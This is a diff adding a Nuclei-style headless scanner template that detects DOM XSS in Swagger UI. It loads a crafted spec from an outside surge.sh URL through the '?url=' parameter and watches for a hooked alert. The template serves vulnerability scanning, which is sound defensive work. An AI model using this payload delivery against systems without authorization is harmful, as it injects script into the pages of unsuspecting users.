@@ -1,0 +1,36 @@
+id: swagger-dom-xss-url
+info:
+  name: Swagger DOM XSS
+  author: melbadry9
+  severity: medium
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}?url=https://jumpy-floor.surge.sh/test.yaml"
+        action: navigate
+      - action: waitload
+
+      - action: script
+        args:
+          code: function(){ window.alert=function(msg){if(msg == 'textarea'){vul=true} }}
+          hook: true
+
+      - action: script
+        args:
+          code: function(){vul = false}
+          
+      - action: sleep
+        args:
+          duration: 6
+
+      - action: script
+        name: test
+        args:
+          code: function(){return vul}
+
+    matchers:
+      - part: test
+        type: word
+        words:
+          - "true"
